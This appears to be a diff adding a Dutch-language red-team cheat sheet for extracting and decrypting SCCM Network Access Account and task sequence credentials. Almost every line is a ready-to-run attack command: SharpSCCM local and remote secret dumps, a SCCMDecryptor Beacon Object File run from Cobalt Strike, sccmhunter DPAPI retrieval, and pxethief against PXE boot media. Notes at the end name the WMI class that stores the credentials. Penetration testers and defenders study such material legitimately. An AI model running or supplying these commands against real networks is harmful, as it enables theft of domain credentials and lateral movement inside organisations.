@@ -1,0 +1,32 @@
+# SCCM Secret Decryptie — NAA en Task Sequence credentials
+# SCCM slaat Network Access Account en task sequence wachtwoorden
+# lokaal op in WMI, registry of CIM — deze zijn te decrypten
+#
+# === Vereisten ===
+# - Local admin op SCCM-managed client
+# - Of toegang tot SCCM database (SMS Provider)
+#
+# === Voorbeelden ===
+
+# SharpSCCM - NAA (Network Access Account) ophalen via WMI
+.\SharpSCCM.exe local naa -m wmi
+
+# SharpSCCM - NAA via disk (CIM repository)
+.\SharpSCCM.exe local naa -m disk
+
+# SCCMDecryptor BOF - Beacon Object File voor NAA
+# (vanuit Cobalt Strike)
+inline-execute SCCMDecryptor.o
+
+# sccmhunter - Remote NAA credentials ophalen
+python3 sccmhunter.py dpapi -u USER -p 'PASS' -d DOMAIN -dc-ip DC_IP -target SCCM_SERVER
+
+# Task Sequence wachtwoorden ophalen
+.\SharpSCCM.exe get secrets -sms SMS_SERVER -sc SITECODE
+
+# Policy secrets via PXE boot media
+python3 pxethief.py 2 SCCM_PXE_SERVER
+
+# Noot: NAA is een domain account dat clients gebruiken voor netwerktoegang
+# Noot: NAA credentials worden vaak te breed ingesteld (domain user of hoger)
+# Noot: WMI class: root\ccm\policy\Machine\ActualConfig - CCM_NetworkAccessAccount
